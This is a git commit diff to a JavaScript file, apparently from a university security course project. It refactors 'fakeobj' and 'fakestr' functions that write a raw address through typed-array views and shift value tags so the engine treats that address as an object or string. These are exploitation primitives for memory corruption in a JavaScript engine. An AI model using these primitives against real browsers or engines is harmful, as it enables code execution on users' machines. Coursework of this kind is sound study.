8a0f493913ab80d65fa925effdb2a29a88fbea86
WilliamGrossKC <wgross769@gmail.com>
2022-04-09 18:46:33 -0500

    Update parta.js

--- proj5/parta.js
+++ proj5/parta.js
@@ -17,31 +17,30 @@ let fakeobj = function(addr){
     const temp = Math.pow(2, 32);
     bitview[1] = Math.floor(addr/temp);
     bitview[0] = addr >>> 0;
+    
     let first = {"int" : 420, "object" : floatview[0]};
     first.eight();
     let second = {"val" : first.int, "objtag" : -1};
     second.eight();
-    let result = second.val;
     
+    let result = second.val;
     first.eight();
     second.eight();
     return result;
 };
 
-let fakestr = function(thing){
-    let temp = Math.pow(2, 32);
-    bitview[1] = Math.floor(thing/temp);
-    bitview[0] = thing >>> 0;
+let fakestr = function(addr){
+    const temp = Math.pow(2, 32);
+    bitview[1] = Math.floor(addr/temp);
+    bitview[0] = addr >>> 0;
+    
     let first = {"int" : 420, "object" : floatview[0]};
-    // shift the first value plane
     first.eight();
-    let second = {"val" : first.gg, "floattag" : -7};
-    // shift the second value plane
-    // suddenly, value of thing is now tagged with a str!
+    let second = {"val" : first.int, "strtag" : -7};
+    
     second.eight();
-    let fakedstr = second.val;
-    // reshift to not corrupt pointers
+    let result = second.val;
     first.eight();
     second.eight();
-    return fakedstr;
+    return result;
 };
